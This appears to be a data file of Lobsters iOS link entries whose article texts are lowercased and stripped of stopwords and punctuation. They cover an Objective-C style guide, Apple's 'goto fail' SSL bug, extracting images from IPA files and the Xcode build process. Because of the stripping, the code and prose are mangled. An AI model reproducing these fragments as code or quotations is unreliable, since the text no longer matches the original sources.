shoulduseliterals yes nsnumber buildingzipcode nsarray name nsarray arraywithobjects brian matt chris alex steve paul nil nsdictionary productmanagers nsdictionary dictionarywithobjectsandkeys kate iphone kamal ipad bill mobile web nil nsnumber shoulduseliterals nsnumber numberwithbool yes nsnumber buildingzipcode nsnumber cgrect function accessing x width height cgrect code must use cggeometry function instead direct struct member access apple cggeometry reference function described reference take cgrect data structure input implicitly standardize rectangle calculating result reason application avoid directly reading writing data stored cgrect data structure instead use function described manipulate rectangle retrieve characteristic example cgrect frame selfviewframe cgfloat x cgrectgetminx frame cgfloat cgrectgetminy frame cgfloat width cgrectgetwidth frame cgfloat height cgrectgetheight frame cgrect frame selfviewframe cgfloat x frameoriginx cgfloat frameoriginy cgfloat width framesizewidth cgfloat height framesizeheight constant constant recommended inline string literal number allow easy reproduction commonly used variable quickly changed without need find replace constant must declared static constant constant may declared define explicitly used macro example static nsstring const nytaboutviewcontrollercompanyname new york time company static const cgfloat nytimagethumbnailheight define companyname new york time company define thumbnailheight enumerated type using enums new fixed underlying type specification must used provides stronger type checking code completion sdk includes macro facilitate encourage use fixed underlying type nsenum example typedef nsenum nsinteger nytadrequeststate nytadrequeststateinactive nytadrequeststateloading bitmasks working bitmasks nsoptions macro must used example typedef nsoptions nsuinteger nytadcategory nytadcategoryautos nytadcategoryjobs nytadcategoryrealstate nytadcategorytechnology private property private property shall declared class extension anonymous category implementation file class example interface nytadvertisement property nonatomic strong gadbannerview googleadview property nonatomic strong adbannerview iadview property nonatomic strong uiwebview adxwebview end image naming image name named consistently preserve organization developer sanity image named one camel case string description purpose followed unprefixed name class property customizing one followed description color andor placement finally state example refreshbarbuttonitem refreshbarbuttonitem refreshbarbuttonitemselected refreshbarbuttonitemselected articlenavigationbarwhite articlenavigationbarwhite articlenavigationbarblackselected articlenavigationbarblackselected image used similar purpose grouped respective group image folder asset catalog booleans value must compared directly yes yes defined bool objectivec char type bit long value return compared yes object pointer someobject someobject nil bool value isawesome somenumberboolvalue somenumberboolvalue isawesome yes never name bool property expressed adjective property name may omit prefix specify conventional name getter example property assign getteriseditable bool editable text example taken cocoa naming guideline singleton singleton object use threadsafe pattern creating shared instance instancetype sharedinstance static id sharedinstance nil static dispatchoncet oncetoken dispatchonce oncetoken sharedinstance self class alloc init return sharedinstance prevent possible sometimes frequent crash import one import statement statement must grouped together group may commented note module use import syntax framework import quartzcore model import nytuserh view import nytbuttonh import nytuserviewh protocol delegate data source protocol first parameter method object sending message help disambiguate case object delegate multiple similarlytyped object help clarify intent reader class implementing delegate method example void tableview uitableview tableview didselectrowatindexpath nsindexpath indexpath void didselecttablerowatindexpath nsindexpath indexpath xcode project physical file kept sync xcode project file order avoid file sprawl xcode group created reflected folder filesystem code grouped type also feature greater clarity target build setting treat warning error enabled enable many additional warning possible need ignore specific warning use clang pragma feature objectivec style guide fit taste look style guide
543,Lobsters,ios,Apple iOS,iOS security whitepaper,http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf,io security whitepaper,,character limit please include personal information comment maximum character limit submit
545,Lobsters,ios,Apple iOS,Popular iOS Games That Could Have Been Designed for 8-Bit Systems,http://prog21.dadgum.com/191.html,popular io game could designed system,popular io game could designed system commodore version trapped exposure preexisting idea permalink previously,popular io game could designed systemsamid flappy bird hoopla struck could brought game life thirty year ago home computer thought idea course someone confirmed hypothesis writing commodore version made wonder popular io title meet criterion implementable computer ca nt simply equated pixelated graphic designed game spent lot time front making sure idea good match hardware rendering dozen even half sprite arbitrary position nt possible ditto kind scaling rotation translucency flappy bird undershoots hardware atari learned program sparse scrolling background one tiny sprite io game would work jetpack joyride never seen take flappy bird change control touchandhold move upward drop released make scrolling world interesting pipe add floating coin collect gist anyway nicety would translate like semiprocedural environment missionlike objective fly without collecting coin special vehicle commandeer would need dropped icing core gameplayridiculous fishing first glance lot going visually drop line many layer fish design move look like concession hardware fish swim horizontal band system hardware sprite limit many displayed scan line sprite modified repositioned screen draw top bottom four sprite repurposed eight twelve twenty long separate strip good match fishing portion game le bonus shooting segment would need rethink super hexagon one look impossible based around hardwareaccelerated polygon could designed bold coder key polygon flat graphic design sense texture gradient move huge flat triangle across screen retro machine draw line one side triangle background color draw new line side repeat writing line clipper take work doable nt collide shape part design easy mathheavy polygon collision routine replaced checking single sprite overlap nonbackground pixel registerthrees straightforward one technical trickery major omission necessary retro fourway joystick perfect input deviceall design could discovered thirty year ago nt think someone could come jetpack joyride objective system nt ten year later still nt pleasant reminder good design nt technology thoughtful human side development nt need move breakneck pace come associate computing world liked might enjoy trapped exposure preexisting idea permalink february
548,Lobsters,ios,Apple iOS,Apple's SSL/TLS bug,https://www.imperialviolet.org/2014/02/22/applebug.html,apple ssltls bug,security update top apple published source code serverkeyexchange peter nelson tlslite,yesterday apple pushed rather spooky security update io suggested something horribly wrong ssltls io gave detail since answer top hacker news thread guess cat bag already misinformationquashing stage apple bug static osstatus sslverifysignedserverkeyexchange sslcontext ctx bool isrsa sslbuffer signedparams signature signaturelen osstatus err err hashctx serverrandom goto fail err hashctx signedparams goto fail goto fail err hashctx hashout goto fail fail sslfreebuffer signedhashes sslfreebuffer hashctx return err quoted apple published source code note two goto fail line row first one correctly bound statement second despite indentation nt conditional code always jump end second goto err contain successful value update operation successful signature verification never fail signature verification checking signature serverkeyexchange message used dhe ecdhe ciphersuites communicate ephemeral key connection server saying ephemeral key signature certificate know link ephemeral key certificate chain broken everything fall apart possible send correct certificate chain client sign handshake wrong private key sign proof server posse private key matching public key certificate since securetransport affect io point prior confirmed also o x prior confirmed affect anything us securetransport software platform although chrome firefox use n ssltls however nt mean much say software update system machine might using securetransport coded quick test site http note port number cve number normal site running port expected work port server sending certificate signing completely different key load http site port bug certificate chain correct link handshake chain broken nt believe sort certificate pinning would stopped also nt affect site using dhe ecdhe ciphersuites attacker get choose ciphersuite case choose one work also nt affect tl different function verifying different serverkeyexchange message tl attacker choose version client accept client enables tl appears would workaround issue likewise client enabled plain rsa ciphersuites serverkeyexchange also work around issue two former workaround much preferable based test site io o x fix issue update look like bug introduced o x existed least version io io released yesterday fix sort subtle bug deep code nightmare believe mistake feel bad whoever might slipped editor created stripped code issue extern int f int g int ret goto ret f return ret compile wall enable warning neither gcc clang xcode make peep dead code surprising better warning could stopped perhaps false positive rate high real codebases thanks peter nelson pointing clang wunreachablecode warn wall maybe coding style contributed allowing ifs without brace one incorrect indentation brace nt seem terribly convincing test case could caught difficult deep handshake one need write completely separate tl stack lot option sending invalid handshake chromium patched version tlslite sort thing recall test case exactly sound like know monday morning involves code review effective sort bug auditing review change go idea code review culture like apple strongly believe colleague wanteh ryan sleevi would caught slipped like although everyone blessed folk like lastly lot discussion yesterday apple missed checking hostname certificate true curl o x command line oddly accepts http connection ip address ip address nt certificate ca nt find anything safari nt problem
549,Lobsters,ios,Apple iOS,Composite Prototyping Tool for iPhone Updated with Fixed Elements Support,http://www.getcomposite.com/blog/2014/02/15/composite-v1-2.html,composite prototyping tool iphone updated fixed element support,rapid loan fast website,today releasing big update composite brings along number new feature along brand new look updated io device main feature release fixed element let create even realistic looking prototype allows define layer group instance navigation bar stay fixed viewport rest document scrolling similar solution seen rapid loan fast website layer want remain fixed simply add fixed name layer layer group composite determine whether anchor layer top screen bottom based layer position canvas also included new transition fade sliding sideways addition go flip transition already supported three extra direction flipping make new list transition push pop modal close flip flipright flipleft flipup flipdown fade slideleft slideright jumping right onto making composite even better also bringing new device tweaking usage ipad stay tuned
550,Lobsters,ios,Apple iOS,SprityBird - A small clone of Flappy Bird using SpriteKit,https://github.com/kirualex/SprityBird,spritybird small clone flappy bird using spritekit,join github today sign file permalink http githubcomfsiuspritybirdinswift spritybird gif resource license reload reload,small clone flappy bird io using spritekit framework dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time access swift version project http githubcomfsiuspritybirdinswift spritybird project small clone flappy bird io using spritekit framework used base many type scrolling game imagination gif small clone flappy bird io using spritekit framework resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
551,Lobsters,ios,Apple iOS,Developing a mobile cross-platform library - Part 1. Exploring,http://www.skyscanner.net/blogs/developing-mobile-cross-platform-library-part-1-exploring,developing mobile crossplatform library part exploring,including experience exploring solution developing mobile crossplatform library ie single codebase could part mobile apps running different platform cover journey mobile crossplatform development tool phonegap titanium like code porting tool webviews task c javascript engine work many resource explaining approach problem thought could helpful shared experience first three part list explored solution follow post c javascript engine part currently hold market new io version high adoption rate need support version since froyo gingerbread want good coverage option mobile crossplatform development tool webview tool phonegap rhomobile sencha touch appmobi telerik adobe air xamarin appcelerator titanium corona mosync kony triggerio openfl dragonrad option c option code porting hyperloop xmlvm apportable avian box option javascript webview answer answer option javascript javascript engine development inactive time development active conclusion android crossplatform io library mobile technology related,including experience exploring solution developing mobile crossplatform library ie single codebase could part mobile apps running different platform cover journey mobile crossplatform development tool phonegap titanium like code porting tool webviews task c javascript engine work many resource explaining approach problem thought could helpful shared experience first three part list explored solution follow post c javascript engine part write run anywhere wellknown slogan created illustrate java crossplatform functionality programmer would like run code anywhere however cpu architecture impossible keep new programming language emerge every day framework come go want interact o code reusability question maybe narrowed scope mobile device could chance apparent trend towards mobile day developing mobile crossplatform library would definitely benefit developer let say narrow even io android currently hold market leaf u target cpu architecturesabis io armeabi mips android programming language objectivec io java android framework os support last io version sufficient new io version high adoption rate come android need support version since froyo gingerbread want good coverage see easy task made work wanted achieve summarized diagram one library shared two platform platformspecific glue code order make work skyscanner heavily relying internet networking functionality essential normally io library imported either objectivec source code prebuilt static library binary accompanied respective header file android apart java source code library also imported class bytecode file staticshared library binary however since option restrictive research took place went step explored alternative way importing code android io start option tool make life easier option mobile crossplatform development tool mobile developer must heard numerous mobile crossplatform development tool like phonegap appcelerator titanium xamarin tool allow u develop library right well main problem approach tool usually output endproduct appipa apk library embed runtime environment run crossplatform code difficult interface code running environment native code list tool investigated reason work webview tool tool using webview runtime environment coding immediately dismissed would difficult interface code running webview however also attempted see later tool phonegap rhomobile sencha touch appmobi telerik adobe air runtime environment adobe integrated runtime dismissed due difficulty interfacing code air xamarin output intermediate xamarin library native one appcelerator titanium building native library officially supported could possibly work wrote titanium extension would allow interfacing native code much trouble questionable result sure remain functional next titanium corona corona people claim supported android coming feature io mosync corona kony supported triggerio supported openfl supported dragonrad date seem support hence failure nothing worked wait second cc code accessible io android option c developing library c one two solution work android native development kit ndk java native interface jni framework allow runninginterfacing cc code java ndk responsible compiling c code android target armeabi mips jni allows communication two language using jni quite verbose programmer must adhere naming convention two level wrapper required java c one hand java wrapper provide java api c library exposing c class method native keyword java hand c wrapper provide bridge java wrapper c library translate object two language io thing much simpler naming convention one level wrapper required using objectivec objectivec language variant allows objectivec c code single source file consequently object translation happening single level wrapper see slightlymodified diagram androidios apps including party library unusual programmer access jreandroid cocoa touch framework case party library included either source code prebuilt binary either find build one specification library performing networking operation http request supported standard template library stl integrated libcurl crossplatform library libcurl could included source code configure script executed luckily prebuilt binary found io android used ndk toolchainscompilers built libcurl android target building library target io android timeconsuming part process automated script solution worked quite well c popular language vast number party library used tool used android ndk jni objectivec official solution supported google apple drawback approach android want keep reference c object java wrapper object manually garbage collect c object manually call delete cppobject java object released however reason retain c object copied java one destroyed immediately copying detail along code snippet solution published separate post next week option code porting another option considered maintain one codebase use appropriate tool translate code platform needed option drawback well generated code efficient code written native developer bug likely introduced manually fixed imported binary unlikely translated tool translate source code several mobile code porting tool however none provided required functionality tool translating java code objectivec supported google seems like highquality tool compared rest currently limited amount java class translated objectivec work progress unfortunately translate java http request moment implemented functionality separately platform could possibly work project alive since september hyperloop tool translates javascript native source code currently support io stable plan expand popular platform project alive since august tool translates objectivec code java could good solution well unfortunately mature enough contains many bug output noncompilable code xmlvm tool allows crosscompiling jvm bytecode objectivec neither tool appeared good enough complex use requires lot legacy jar downloadedimported apportable tool take care porting io app android unfortunately meet criterion translates whole apps library output apk android application package file avian lightweight java virtual machine could embedded io app bundle run java code solution provide desired functionality would difficult io ui code interfacing library java code running vm box porting dalvik vm android gingerbread apis top io solution dismissed project longer active option javascript webview javascript language gaining popularity rapidly last year originally used clientside scripting also used serverside application nodejs part several mobile crossplatform tool investigated maybe could crossplatform language solves problem well mobile platform execute javascript script webbrowser view webviews webview apis usually exposed app developer let see minimum functionality need javascript executing script calling function evaluating global variable returned result performing callback native code let investigate platform separately android webview execute script string callback java implemented annotating javascriptinterface certain method java class callable javascript adding reference instance class webview javascript global scope addjavascriptinterface method however evaluating variable function call straightforward way directly evaluate script workaround pas callback function javascript result evaluated callback function get called passing result java method shown answer io uiwebview execute script string unlike android evaluate global variable function call stringbyevaluatingjavascriptfromstring returned string appropriate conversion made result string however callback straightforward android mechanism uiwebview horrible workaround calling objectivec javascript try open new url custom callback scheme eg skycallback javascript capture event objectivec parse url scheme name callback scheme either parse string url resource path evaluate global variable result stored shown answer see interaction javascript native code complicated different platform likely result bug code grows size inevitably become unmaintainable consequently option abandoned option javascript javascript engine javascript library running standalone javascript engine also worked interacting javascript engine much straightforward compared webview unfortunately pure javascript engine lack networking functionality xmlhttprequest object responsible http request javascript available part webbrowser strict javascript specification result different architecture applied delegating networking functionality platformspecific glue code complicates thing particularly interested developing crossplatform javascript library worked io javascriptcore engine used awesome javascriptcore framework framework introduced io easy integrate app within second would cocoa touch framework api simple glue code needed concise android thing bit complicated javascript engine embed one manually two javascript engine successfully embedded rhino rhino written java easy embed add app size developed mozilla foundation development inactive time bit difficult embed written c hence android ndk jni used order interface java adding one layer translation java c javascript instead java javascript addition app size increased something might negligible apps however development active crossplatform library developed javascript http request performed stub stub act placeholder overridden library loaded javascript engine get replaced method call native platformspecific method request implemented full description javascript javascript engine solution found part sequence post published following week conclusion several tool technique explored two worked one hand c solution widely used reliable flexible solution significant drawback manual garbage collection java workaround proposed hand javascript solution easier implement missing functionality overcomplicates architecture dependent either rhino actively developed significant impact app size use one approach take drawback consideration proceed care project seemed promising worth revisiting future corona mosync appcelerator hyperloop nashorn javascript engine written java oracle android crossplatform io library mobile technology related
552,Lobsters,ios,Apple iOS,Delighting your users with SBJson 4,https://speakerdeck.com/stig/delighting-your-users-with-sbjson-4,delighting user sbjson,,argument using eventbased json parsing improve user experience downloading list record many written app downloads list record raise hand please cut page size reduce latency cost connection overhead time slide red arrow download one record blue parse one record traditional approach app get hold result downloaded parsed slide notice difference get last record early get first one called chunked delivery resonates http chunk twitter example let subscribe http chunked stream json document slide downloads multicore actually continue downloading without waiting parser thing thus end complete download wait parser parse last record slide somewhat silly slightly misleading chart best skip move rest slide grasshopper change thin talk slide note input contains multiple toplevel json document concatenated together assume data function creates nsdata instance containing encoded data character pas call parse method multiple time twitter us style streaming essentially http chunk contains complete json document slide contrast previous example input contains single toplevel document outer array gray slide version supported unwrapping object well leaked key also supported arbitrarydepth document removed interest clarity slide normally json parser would parse validate complete document would refuse parse however force seen entire document parsing parsing stream relax requirement multiroot parser would still balk root unwrapping parser call value block twice call error handler saying next bit parsed slide value block called chunk json encounter either toplevel document multiroot firstlevel subdocument unwrapping root array slide parse method return status handy unwraproot array parser return root array closed example parser return set stop argument value block yes
553,Lobsters,ios,Apple iOS,Single Responsibility Principle & iOS,http://bendyworks.com/geekville/articles/2014/2/single-responsibility-principle-ios,single responsibility principle io,single responsibility principle io view controller io need talk shadow worst offender single responsibility principle need stop first background agile software development example afnetworking facade problem heuristic approach propose intention action sample app feel clean listrophy snow mobile,single responsibility principle io view controller io need talk shadow worst offender single responsibility principle need stop first background single responsibility principle srp defined robert martin affectionately book agile software development following class one reason change differs one might expect principle prescribe personally assumed mean class one reason act terrible interpretation lack empathy software team focusing class might changed srp allows u think interact code present instead requiring u project mind onto future running environment believe important freeing distinction example concoct example need download file server sure could use afnetworking assume yet exist approach might following interface interface downloader void download nsstring path withsuccess void id resp success end interface downloader void buildrequestobject void start void datachunkwasreceived nsdata data void downloaddidfinish void closesession end might ever want change class think two reason immediately first operation team may added ssltls must use custom certificate second server application team may add json mime type intend deprecate soap fistpump situation single responsibility principle advises u turn downloader class facade downloaderconnection downloaderparser class extension wish interface downloaderconnection interface downloader connection void buildrequestobject void start void closesession end interface downloaderparser interface downloader parser void datachunkwasreceived nsdata data void downloaddidfinish end know attack changing business requirement use internal server company problem exposure sample code template code production code io brain already made connection view controller usage usually ignores srp completely without exposure u like counting scar enumerate reason might need change view controller api datastore changed uiactionsheet need converted fullblown popover presentation view animation need tweaking new business requirement need capture phone number contact anabpeoplepickernavigationcontroller instead email button need stricter validation tapping particular button need trigger different selector position subview requires complex calculation many edge case many yet discovered myriad reason relating domain application end result locus change characterized file application business logic form much resembling spaghetti perhaps charitable type file may line one never intended human file database dump prime example using pragma mark indicative failure adhere single responsibility principle signpost poor code heuristic approach faced daunting task community may indeed towel code might say long work architecture matter might unsurprised hear disagree code written human otherwise still writing microcode architecture matter accepted behavior throw harmful everyone novice highfunctioning team expert want reduce number reason might change view controller one order let u pick one reason exclude others view controller may contain code effect view change response data change one might think already write view controller way well sure page allow propose rule must followed order adhere heuristic ibaction macro must used view controller interface block view header file must blank view controller may implement extra delegate datasource protocol except observing model change view controller may work viewdidload awakefromnib viewdidappear viewdiddisappear response observed change model layer abide rule respect single responsibility principle view controller propose first apple helpfully provides number mechanism example uitableviewdatasourceallows u convert database enumeration domain object uialertviewdelegate provides mechanism handle choice uialertview follow srp protocol apply object view controller custom behavior define new class object turn view interaction model update found name object class literature perhaps controller also invent name intention use intention without polluting view controller embed storyboard scene nib allowing many intention object per scene use interact directly model layer mutable data structure iboutlet coredata couchbase whatever intention know view controller vice versa architecting application way fully embrace modelviewcontroller mvc pattern cocoa allegedly promotes decouple interaction intent intent result result affordances intention action implement simple email field button enablesdisables based valid email address using core data first define intention enteremailintention updating email field toggle save button depending validation saveemailintention tapping button save nsmanagedobjectcontext moc data model simple enough person entity email attribute regex validation az nb use regex production constructing appropriate class intention creating personproxy person end following implementation view controller implementation masterviewcontroller void viewdidload super viewdidload nsnotificationcenter center nsnotificationcenter defaultcenter center addobserver self selector selector emailchanged name nsmanagedobjectcontextobjectsdidchangenotification object selfmanagedobjectcontext center addobserver self selector selector personsaved name nsmanagedobjectcontextdidsavenotification object selfmanagedobjectcontext self setenabledforsavebutton void dealloc nsnotificationcenter defaultcenter removeobserver self warning big assumption made change moc must email textfield changed typically switch notification nsupdatedobjectskey userinfo void emailchanged nsnotification note self setenabledforsavebutton void setenabledforsavebutton selfsavebutton setenabled selfpersonproxyperson validateforinsert nil void personsaved nsnotification note self performseguewithidentifier advance sender note end long implement intention class connect iboutlet variable correctly storyboard view controller implement sought effect view change response data change intention class obey srp well since know exactly class approach given new requirement file scene layout seen sample app github feel implementing separation concern first time felt free thought clean like continued work added another view controller project expecting one vcs thought could get away using new scheme wrong quickly gave new architecture immediately felt better code extracting interaction storage logic view controller leaf lean manageable class familiar term basically turned view controller view model talk tweet listrophy discus leave comment attend snow mobile feb chat person solidify good practice around presuming good idea importantly start experimenting whether proprietary codebase open source library sample code blog forum better architecture one small step towards end edit added warning vc code switching nsnotification fixed typo uimanagedobjectcontext nsmanagedobjectcontext thanks pointed
554,Lobsters,ios,Apple iOS,(Facebook Paper codebase and scaling),http://inessential.com/2014/02/03/apology,facebook paper codebase scaling,wrote dave morin infamous interview q quora new facebook app paper grant paul tweeted sam marshall tweeted,sorry snarky jerk day twitter wrote xcode handle scale new day night phone day night phone part refers dave morin infamous interview never read funny xcode handle scale part refers recent q quora new facebook app paper comment undeserved beneath apologize paper team without reservation though used paper facebook account heard people whose taste respect remarkable achievement excellent app apologize also congratulate team nevertheless still interested detail would io app complexity presumably much le garageband instance scale hardtohandle xcode apps xcode handle handle well bet though seen eye easy imagine photoshop microsoft office chromium difficult handle xcode know fact stipulate facebook io developer grant paul tweeted brentsimmons alanzeino ashfurrow example paper project workspace take second open highend rmbp sure sound like xcode handle paper scale second ridiculous imagine operation similarly slow would started breaking paper separate workspace hit six project fewer call matter personal style though claim best practice question mind project workspace know theory may true combination may true perhaps every line io code ever written project quora page suggests much paper life codebase mobile apps facebook hundred regular contributor another possibility reimplementing uikit part quora page engineering complexity finding way fully utilize multicore architecture newer iphones top uikit framework support multithreading significant work went creating framework rendering work multiple thread spent long time finding balance performance complexity turning synchronous operation asynchronous one add lot cognitive overhead one biggest challenge project know complex challenging operation queue block rendering work multiple thread hard day far developer long enough extremely comfortable know detail make difference also possible using ton external library sam marshall tweeted alanzeino dannolan php chromium webkit zlib libjpg jsonkit yaml yasm license cited paper license file earth true workspace includes code bunch external library including huge one know think instance use systemsupplied json parser well answer might bug apple code certainly could need uiwebview provides private build webkit know speculating thing even good reason every one project good reason need project build almost io app maybe garageband xcode handle scale almost always considered signal xcode workspace need major surgery point workspace individual developer handle either particularly io apps macbu adobe ignore point know detail totally guessing come specific case facebook paper definitely say workspace sign problem code process still though project massively curious happen next deal
555,Lobsters,ios,Apple iOS,Ready to cast: Chromecast now open to developers with the Google Cast SDK,http://googledevelopers.blogspot.com/2014/02/ready-to-cast-chromecast-now-open-to.html,ready cast chromecast open developer google cast sdk,,blog latest news update story developer
556,Lobsters,ios,Apple iOS,iOS holding my phone number hostage = the worst bug I‚Äôve ever experienced,http://blog.benjaminste.in/post/75389520824/ios-holding-my-phone-number-hostage-the-worst-bug,io holding phone number hostage worst bug ever experienced,friend sends group message includes send group imessage group mm receive tell every single one friend delete every single message thread ever hugely successful text messaging company updatesresponses hacker news update,two month ago switched iphone android huge io fan since first day deal although topic another post got verizon motox happier could switch pretty much every app used running w android primary phone fully loaded within hoursbut something really strange happened noticed getting text message lot people getting annoyed responding getting annoyed respondingwhat happened work laptop still configured messagesapp message still sending imessage showing work laptop phonethis pretty annoying understandable monday went office turned imessage thought everything would fineeverything far finehere week later current situation friend io friend sends message first try send imessage fails tech savvy folk get option resend text message get pretty annoying catastrophicif friend sends group message includes send group imessage group mm receive icing cake fails silently get failed notification message dropped ether never get know failedapple tried hard help problem unfortunately solution tell every single one friend delete every single message thread ever onlet recap longer iphone phone number associated apple icloud imessage facetime every single io device ever messaged past year phone number cached every single phone try message via imessage sm make matter worse fails silently add insult injury vast majority messaging done past year group message picture child would bad enough delete year messaging history ask wife sister best friend literally every person know delete message history got kidding feel completely hostage solution insane apple phone number held hostage way get backnotes apple customer support tried hard help everyone interacted fantastic super friendly user left io android got ta love irony founder cto hugely successful text messaging company get text message updatesresponses hacker newsyes resetdeactivatedcancelled everything possible icloud imessage facetime etc every device apple web sitesi even apple support revoke certificate authenticate tried apple engineer confirmed record number serverside client side cache issue every person handsetand changing phone number year good solutionwhen say ever experienced mean experience message failing silently awful example sister messaged tell baby girl idea day even know congratulate update month since switchednothing able apple able fixed problem able put message debug mode sent apple full debug log apple bug report marked ticket duplicate longer able view updatesafter month issue resolvedthe majority grouptexts work iphones send whole thread mm imessage still pretty goodmost friend send sm without failure quite still get imessage failed resend sm completely given trying fix problem hoping remaining io device resolve point apple fix next update rant everyone think android problem message anymore really tough explain world iphone buggy rant
557,Lobsters,ios,Apple iOS,How to Extract the Images From Any App in the App Store,http://objcsharp.wordpress.com/2014/01/22/how-to-extract-the-images-from-any-app-in-the-app-store/?goback=.gde_2627917_member_5833568980127744002#!,extract image app app store,extract image app app store original fullresolution image without jailbreaking without special software itunes apps view finder show window explorer ipa ipa zip zip payload app show package content facebook ipa zip app never plist always uaobfuscatedstring must like martin rybak io app audio bundle content drm extract icon image ipa original package payload png resource video permalink comment,extract image app app store recently discovered incredibly easy extract original fullresolution image resource file like video audio plist file app app store without jailbreaking without special software io developer give fascinating look inside app always sure learning purpose respect apps intellectual property open itunes go apps section yet downloaded synced apps want extract rightclick app icon itunes select view finder mac show window explorer window copy ipa file desktop rightclick file rename replacing ipa extension zip doubleclick zip file open inside payload folder app file mac folder window inside window open folder mac rightclick file select show package content tada see listed app original fullresolution image file see image content facebook app take away ipa file zip file app file package folder apple drm encryption protects app binary noncompiled resource file never keep sensitive string like api key credential plist file always use obfuscation library like uaobfuscatedstring must store sensitive string inside app binary ever think app resource safe prying eye like like loading related martin rybak new york area software developer mba year serverside experience microsoft stack also native io developer since day arc architect develop fullstack web application io apps database system backend service posted io tag app audio bundle content drm extract icon image ipa original package payload png resource video permalink comment
558,Lobsters,ios,Apple iOS,Sharing on iDevices: Apple Opens it Up,http://www.veracode.com/blog/2014/01/sharing-on-idevices-apple-opens-it-up/,sharing idevices apple open,love learn get latest news tip article delivered right inbox,love learn application security get latest news tip article delivered right inbox
560,Lobsters,ios,Apple iOS,Watch that cache: Dropbox and Evernote insufficiently protecting iOS 6 user's data,http://erik.io/blog/2014/01/03/watch-that-cache-dropbox-evernote-insufficiently-protecting-ios-6-data/,watch cache dropbox evernote insufficiently protecting io user data,bring,bring transip ontstaan vanuit de gedachte dat alles altijd beter kan door te blijven innoveren en continu onze producten en diensten te verbeteren zijn uitgegroeid tot de grootste van nederland started back transip originates idea everything always improved continuously innovating grown become largest registrar netherlands een super fijne service en mensen op kantoor die meedenken great service people office think along sven wwwturnkeyco
561,Lobsters,ios,Apple iOS,Telegram Messenger For iPhone And Android (oss),http://telegram.org/,telegram messenger iphone android os,,requested url blocked per direction received department telecommunication government india
562,Lobsters,ios,Apple iOS,Xcode Build Process,http://www.objc.io/issue-6/build-process.html,xcode build process,deciphering build log daniel chris controlling build process build phase michele article macho executables custom build phase cocoapods us github project build rule build setting reference build setting build setting reference project file conclusion,kind spoiled day hit single button xcode look like supposed play music second later app running magical something go wrong article going take highlevel tour build process discover tie project setting xcode expose interface deeper look step along way actually work refer article issue deciphering build log first point attack learn inner working xcode build process look complete log file open log navigator select build list xcode show log file prettified format default view hide lot information reveal detail task selecting clicking expand button right side another option select one task list hit cmdc copy full plain text clipboard last least also dump complete log clipboard selecting copy transcript shown result editor menu example log shy line long admittedly biggest chunk originates compiling openssl code let get started first thing notice log output split several big chunk corresponding target project build target podsssziparchive build target makefileopenssl build target podsafnetworking build target crypto build target pod build target ssl build target objcio project several dependency afnetworking ssziparchive included pod well openssl included subproject target xcode go series step actually translate source code machinereadable binary selected platform let take closer look first target ssziparchive within log output target see detail task performed along way example first one processing precompiled header file order make readable stripped lot detail processpch podsssziparchiveprefixpchpch podsssziparchiveprefixpch normal objectivec cd devobjciopods setenv lang enususascii setenv path xcodeapp clang x objectivecheader arch configuration warning flag include path c podsssziparchiveprefixpch podsssziparchiveprefixpchpch block appear task build process let go one detail block start line describes task following indented line list statement executed task case working directory changed lang path environment variable set fun happens order process pch file clang get called ton option line show complete call argument let look x flag specifies language case objectivecheader destination architecture specified implicit defines added c flag tell clang actually c mean run preprocessor parser typechecking llvm generation optimization target specific assembly code generation stage finally mean run assembler produce object file input file output file quite lot going go possible task great detail point complete insight tool get called argument behind scene build process target actually two task process objectivecheader file although one pch file exists closer look task tell u going processpch podsssziparchiveprefixpchpch podsssziparchiveprefixpch normal objectivec processpch podsssziparchiveprefixpchpch podsssziparchiveprefixpch normal objectivec target build two architecture therefore clang process file twice architecture following task processing precompiled header file find couple task type ssziparchive target compilec libtool createuniversalbinary name almost selfexplanatory compilec compiles c file libtool creates library object file createuniversalbinary task finally combine two file previous stage one architecture universal binary file run subsequently similar step happen dependency project afnetworking get compiled linked together ssziparchive pod library openssl get built processing crypto ssl target dependency prepared finally arrive target app log output target includes interesting task next one already saw compilation library phasescriptexecution datamodelversioncompile ld generatedsymfile copystringsfile cpresource copypngfile compileassetcatalog processinfoplistfile processproductpackaging somehashmobileprovision processproductpackaging objcioobjcioentitlements codesign task selfexplanatory name list probably ld name linker tool similar libtool fact libtool simply call ld lipo ld used create executables libtool library check daniel chris article detail compilation linking work step turn call command line tool actual work like saw processpch step instead torturing longer going log file explore task different angle xcode know task performed controlling build process select project xcode project editor presented six tab top general capability info build setting build phase build rule purpose understanding build process last three relevant build phase build phase represent highlevel plan get code executable binary describe different kind task performed along way first target dependency established tell build system target built build current target commence real build phase xcode present gui together build phase cocoapods specific script execution build phase see michele article information cocoapods build process compile source section specifies file compiled note say anything file compiled learn aspect looking build rule build setting file section processed according rule setting compilation complete next step link everything together lo behold find next build phase listed xcode link binary library section list static dynamic library linked object file generated compilation previous step important difference static dynamic library get handled refer daniel article macho executables detail linking done last build phase copying static resource like image font app bundle png image actually copied destination also optimized along way png optimization turned build setting although copying static resource last build phase build process complete yet example code signing still happen considered build phase belongs final build step packaging custom build phase full control build phase default setting need example add build phase run custom script cocoapods us extra work also add additional build phase copy resource useful want copy certain resource specific target directory another nice use custom build phase watermark app icon version number commit hash add run script build phase retrieve version number commit hash following command version usrlibexecplistbuddy c print cfbundleversion infoplistfile commit git revparse short head modify app icon using imagemagick complete example check github project like encourage coworkers keep source file concise add run script build phase spit warning source file exceeds certain size example line find srcroot name h name xargs wc l awk total print warning file line build rule build rule specify different file type compiled normally change anything want add custom processing certain file type simply add new build rule build rule specifies file type applies file processed output go let say created preprocessor take basic objectivec implementation file input par comment within file language created generate layout constraint output file includes generated code since build rule take file input output going use extension mal add custom build rule rule specifies applies file matching mal file processed using custom script call preprocessor input output path argument finally rule tell build system find output build rule since output plain file case get picked build rule compiling file everything proceed written result preprocessing step manually file start script use variable specify correct path file name find list variable available apple build setting reference see value existing environment variable build add run script build phase check show environment variable build log option build setting far seen build phase used define step build process build rule specify file type processed compilation build setting configure detail task saw build log output performed find ton option stage build process compilation linking code signing packaging note setting divided section roughly correlate build phase sometimes specific file type compilation many option reasonably good documentation see quick help inspector righthand side build setting reference project file setting discussed saved project file pbxproj addition projectrelated information eg file group rarely get touch internals file merge conflict would encourage open project file favorite text editor go top bottom surprisingly readable recognize meaning section without many problem reading understanding complete project file like make merge conflict much le scary first look entry called rootobject project file reveals following line rootobject project object follow id object find main project definition begin pbxproject section project object isa pbxproject section contains several key 